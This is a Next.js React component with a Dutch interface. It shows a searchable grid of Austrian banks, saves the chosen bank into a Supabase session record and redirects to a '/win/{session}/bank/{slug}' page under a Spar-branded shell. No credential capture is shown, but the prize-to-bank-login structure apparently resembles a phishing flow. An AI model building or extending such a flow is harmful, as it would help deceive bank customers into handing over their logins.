"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { SparShell } from "@/components/demo/SparShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { AT_BANKS } from "@/lib/at-bank-catalog";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function BankenClientClean({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();
  const [bankSlug, setBankSlug] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [recovering, setRecovering] = useState(false);

  const demoOptions = useMemo(
    () =>
      AT_BANKS.map((bank, index) => ({
        slug: bank.slug,
        displayName: bank.name,
        domain: bank.domain,
        logoFile: bank.logoFile,
      })),
    [],
  );

  const filteredOptions = useMemo(() => {
    const q = searchTerm.trim().toLowerCase();
    if (!q) return demoOptions;
    return demoOptions.filter((opt) => opt.displayName.toLowerCase().includes(q));
  }, [searchTerm, demoOptions]);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cachedSessionId = localStorage.getItem("activeSessionId");
      if (cachedSessionId) {
        setRecovering(true);
        router.replace(`/banken?session=${encodeURIComponent(cachedSessionId)}`);
      }
    } catch {
      /* ignore localStorage access errors */
    }
  }, [sessionId, router]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setBankSlug(fd.bankSlug ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleBankSelect(nextBankSlug: string, displayName: string) {
    if (!supabase || !sessionId || !nextBankSlug) return;
    setSaving(true);
    setMsg(null);
    setBankSlug(nextBankSlug);

    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const { error } = await supabase
      .from("sessions")
      .update({
        current_step: "banken",
        form_data: {
          ...prev,
          bankSlug: nextBankSlug,
          bankName: displayName,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Opslaan mislukt.");
    else router.push(`/win/${sessionId}/bank/${nextBankSlug}?session=${encodeURIComponent(sessionId)}`);
  }

  if (!supabase) {
    return (
      <SparShell title="Bankselectie">
        <ConfigMissing />
      </SparShell>
    );
  }

  if (!sessionId) {
    if (recovering) {
      return (
        <SparShell title="Bankselectie" subtitle="Sessie wordt hersteld...">
          <div className="flex justify-center py-12">
            <div className="size-10 animate-spin rounded-full border-4 border-spar-green/30 border-t-spar-green" />
          </div>
        </SparShell>
      );
    }
    return (
      <SparShell title="Bankselectie" subtitle="Ongeldige link.">
        <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
          Gebruik de volledige link om verder te gaan.
        </p>
      </SparShell>
    );
  }

  return (
    <SparShell>
      <div className="space-y-4 w-full mt-24 sm:mt-6">
        <div className="glass-card rounded-3xl p-5 sm:p-6">
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold text-gray-900">{settings.banken_title}</h2>
            <p className="text-sm text-gray-600 mt-1 font-medium">{settings.banken_subtitle}</p>
          </div>
          
          <div className="mx-auto mb-5 max-w-md">
            <div className="flex items-center gap-3 rounded-full border border-gray-200 bg-white px-4 py-3 shadow-sm">
              <svg aria-hidden viewBox="0 0 24 24" className="h-4 w-4 text-gray-400" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="11" cy="11" r="7" />
                <path d="m20 20-3.5-3.5" />
              </svg>
              <input
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder={settings.banken_search_placeholder}
                className="w-full bg-transparent text-sm text-gray-700 outline-none placeholder:text-gray-400"
              />
            </div>
          </div>

          <div className="max-h-[60vh] overflow-y-auto pr-1">
            <div className="grid grid-cols-2 gap-4 lg:grid-cols-3 pb-4">
              {filteredOptions.map((opt, idx) => (
                <button
                  key={opt.slug}
                  type="button"
                  onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                  disabled={saving}
                  className={`group flex aspect-[16/10] w-full flex-col items-center justify-between rounded-2xl border border-gray-100 bg-white p-4 text-center shadow-sm transition-all duration-300 hover:scale-[1.02] hover:shadow-md ${
                    bankSlug === opt.slug ? "ring-2 ring-[#003b8f]/35" : ""
                  }`}
                >
                  <div className="flex flex-1 items-center justify-center">
                    <img
                      src={opt.logoFile}
                      alt={opt.displayName}
                      className="h-14 w-14 md:h-16 md:w-16 object-cover rounded-[14px] shadow-sm border border-gray-100"
                      onError={(e) => {
                        e.currentTarget.onerror = null;
                        e.currentTarget.style.display = 'none';
                        const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                        if (fallback) fallback.style.display = 'grid';
                      }}
                    />
                    <div className="hidden h-14 w-14 md:h-16 md:w-16 place-items-center rounded-[14px] bg-gradient-to-br from-[#1a1a1a] to-[#2d2d2d] text-xl font-bold text-white shadow-[0_4px_12px_rgba(0,0,0,0.15)] border border-white/10 relative overflow-hidden">
                      <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/10 to-transparent"></div>
                      <span className="relative z-10 drop-shadow-md">{opt.displayName.charAt(0)}</span>
                    </div>
                  </div>
                  <div className="flex h-10 w-full items-center justify-center">
                    <p className="line-clamp-2 text-[13px] md:text-sm font-medium text-gray-700">
                      {opt.displayName}
                    </p>
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>

        {msg ? <p className="text-center text-sm text-red-500 bg-white/80 p-2 rounded-full backdrop-blur-sm">{msg}</p> : null}
      </div>
    </SparShell>
  );
}
